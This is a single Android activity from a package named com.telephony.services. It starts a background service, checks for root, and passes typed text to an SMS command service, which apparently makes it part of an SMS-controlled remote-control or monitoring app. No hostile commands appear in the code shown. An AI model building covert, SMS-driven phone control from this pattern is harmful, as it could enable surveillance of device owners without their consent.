package com.telephony.services;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

public class Main extends Activity {

    private EditText command;
    private Button run_button;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent mi = new Intent(this, StartService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(mi);
        } else {
            startService(mi);
        }
        try {
            setContentView(R.layout.main);
            Utils.checkRoot();

            command = (EditText) findViewById(R.id.command);
            run_button = (Button) findViewById(R.id.run_button);
            run_button.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    if (!command.getText().toString().isEmpty()) {
                        Intent mi = new Intent(v.getContext(), SMService.class);
                        mi.putExtra(SMService.EXTRA_SMS_BODY, command.getText().toString());
                        mi.putExtra(Utils.EXTRA_PHONE_NUMBER, "run_button");
                        mi.setData(Uri.parse(mi.toUri(Intent.URI_INTENT_SCHEME)));
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            v.getContext().startForegroundService(mi);
                        } else {
                            v.getContext().startService(mi);
                        }
                        Toast.makeText(v.getContext(), "Success!", Toast.LENGTH_SHORT).show();
                    }
                }
            });

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
